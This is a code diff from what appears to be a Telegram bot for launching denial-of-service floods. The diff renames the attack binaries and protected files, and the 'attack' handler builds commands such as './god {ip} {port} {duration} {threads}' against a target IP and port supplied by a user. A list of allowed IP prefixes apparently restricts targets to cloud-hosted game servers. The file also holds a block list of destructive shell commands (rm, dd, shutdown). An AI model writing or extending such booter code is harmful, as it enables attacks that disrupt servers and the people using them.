@@ -39,7 +39,7 @@ valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.')
 
 # Adjust this to your local timezone, e.g., 'America/New_York' or 'Asia/Kolkata'
 LOCAL_TIMEZONE = pytz.timezone("Asia/Kolkata")
-PROTECTED_FILES = ["LEGEND.py", "LEGEND"]
+PROTECTED_FILES = ["god.py", "god"]
 BLOCKED_COMMANDS = ['nano', 'vim', 'shutdown', 'reboot', 'rm', 'mv', 'dd']
 
 # Fetch the current user and hostname dynamically
@@ -672,11 +672,11 @@ async def attack(update: Update, context: CallbackContext):
 
     # Determine the attack command based on the argument type
     if argument_type == 3:
-        attack_command = f"./bgmi3 {ip} {port} {duration}"
+        attack_command = f"./god3 {ip} {port} {duration}"
     elif argument_type == 4:
-        attack_command = f"./bgmi4 {ip} {port} {duration} {threads}"
+        attack_command = f"./god4 {ip} {port} {duration} {threads}"
     elif argument_type == 5:
-        attack_command = f"./bgmi {ip} {port} {duration} {byte_size} {threads}"
+        attack_command = f"./god {ip} {port} {duration} {byte_size} {threads}"
 
     # Send attack details to the user
     await context.bot.send_message(chat_id=chat_id, text=( 
